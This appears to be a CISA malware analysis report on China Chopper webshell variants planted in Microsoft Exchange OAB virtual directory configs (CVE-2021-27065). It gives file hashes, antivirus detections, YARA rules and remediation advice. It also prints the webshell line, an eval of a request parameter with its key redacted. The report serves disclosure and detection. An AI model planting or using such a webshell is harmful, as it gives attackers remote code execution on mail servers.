All of the files are modified Offline Address Book (OAB) Virtual Directories (VD) configuration files for Microsoft Exchange Servers. Three of the files have been modified with a variant of the "China Chopper" webshell. The last file is modified with an authentication key. The modifications allow an attacker to remotely access the server and execute arbitrary code on the system(s).

This file is typically used to edit an OAB VD in Internet Information Services (IIS) on Microsoft Exchange servers. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. The OAB ExternalUrl parameter has been modified by a remote operator to include a "China Chopper" webshell which is likely an attempt to gain unauthorized access for dynamic remote code execution against a targeted Microsoft Exchange Server. In this file, the OAB ExternalUrl parameter was configured to accept JavaScript code which will be directly executed on the target system. The modification of the ExternalUrl parameter suggests the operator can dynamically submit queries to this Exchange OAB VD. The ExternalUrl designation that normally specifies the Uniform Resource Locator (URL) used to connect to the virtual directory from outside the firewall has been replaced with the following code: --Begin Code-- hxxp[:]//f/<script language="JScript" runat="server">function Page_Load(){eval(Request["[REDACTED"],"unsafe");}</script> --End Code-- Note: The hard-coded key used for authentication was redacted from the code above. This code allows an attacker to access the shell using a password. Once accessed, the attacker is able to execute commands on the page with server (system) level privileges. 0c5fd2b5d1bfe5ffca2784541c9ce2ad3d22a9cb64d941a8439ec1b2a411f7f8 Tags backdoor trojan webshell Details Name McYhCzdb.aspx Size 2264 bytes Type HTML document, ASCII text, with CRLF line terminators MD5 f751c8fd2a9a4dbf3b5f9ec7fd787cab SHA1 ce72ac7d88bf6c1ab33be213c1698a8c84be0d61 SHA256 0c5fd2b5d1bfe5ffca2784541c9ce2ad3d22a9cb64d941a8439ec1b2a411f7f8 SHA512 e2a9bd4de213894c8306fb84c254d7d1c332c756c93c77123a9d5586547bf27896ec0152ba98594b3bac71f23090f3addf26b14ddedddfa1755f9adcf73f6d9d ssdeep 48:kNrdejol1By90KM5QZXhHwlx/44ONF0qT/i9:ktdejqpAwlaNCqT8 Entropy 4.735542 Antivirus Ahnlab Exploit/ASP.Cve-2021-27065.S1406 BitDefender Generic.ASP.WebShell.H.BCF5C336 ClamAV Asp.Trojan.Webshell0321-9840176-0 Emsisoft Generic.ASP.WebShell.H.BCF5C336 (B) Ikarus Exploit.ASP.CVE-2021-27065 Lavasoft Generic.ASP.WebShell.H.BCF5C336 McAfee Exploit-CVE2021-27065.a Microsoft Security Essentials Exploit:ASP/CVE-2021-27065 Quick Heal CVE-2021-26855.Webshll.41350 Sophos Troj/WebShel-L Symantec Trojan.Chinchop YARA Rules rule CISA_10328929_01 : trojan webshell exploit CVE_2021_27065 { meta: Author = "CISA Code & Media Analysis" Incident = "10328929" Date = "2021-03-17" Last_Modified = "20210317_2200" Actor = "n/a" Category = "Trojan WebShell Exploit CVE-2021-27065" Family = "HAFNIUM" Description = "Detects CVE-2021-27065 Webshellz" MD5_1 = "ab3963337cf24dc2ade6406f11901e1f" SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5" strings: $s0 = { 65 76 61 6C 28 52 65 71 75 65 73 74 5B 22 [1-32] 5D 2C 22 75 6E 73 61 66 65 22 29 } $s1 = { 65 76 61 6C 28 } $s2 = { 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-36] 5D 29 29 2C 22 75 6E 73 61 66 65 22 29 } $s3 = { 49 4F 2E 53 74 72 65 61 6D 57 72 69 74 65 72 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D } $s4 = { 57 72 69 74 65 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D } condition: $s0 or ($s1 and $s2) or ($s3 and $s4) } rule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065 { meta: Author = "CISA Code & Media Analysis" Incident = "10328929" Date = "2021-03-17" Last_Modified = "20210317_2200" Actor = "n/a" Category = "Trojan WebShell Exploit CVE-2021-27065" Family = "HAFNIUM" Description = "Detects CVE-2021-27065 Exchange OAB VD MOD" MD5_1 = "ab3963337cf24dc2ade6406f11901e1f" SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5" strings: $s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 } $s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F } $s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 } condition: $s0 and $s1 and $s2 } ssdeep Matches 91 138f0a63c9a69b35195c49189837e899433b451f98ff72c515133d396d515659 Description This file is an OAB configuration file from a legitimate Set-OABVirtualDirectory cmdlet.

Description This file is an OAB configuration file from a legitimate Set-OABVirtualDirectory cmdlet. This file is typically used to edit a OAB VD in IIS on Microsoft Exchange servers. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. The configuration has been modified with a key in the 'ExternalUrl' field. The key is most likely used for authentication to the server. Mitigation If you find these webshells as you are examining your system for Microsoft Exchange Vulnerabilities, please visit the https://us-cert.cisa.gov/remediating-microsoft-exchange-vulnerabilities website for further information on remediation. Recommendations CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts. Maintain up-to-date antivirus signatures and engines. Keep operating system patches up-to-date. Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. Enforce a strong password policy and implement regular password changes. Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known. Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. Disable unnecessary services on agency workstations and servers. Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header). Monitor users' web browsing habits; restrict access to sites with unfavorable content. Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). Scan all software downloaded from the Internet prior to executing. Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
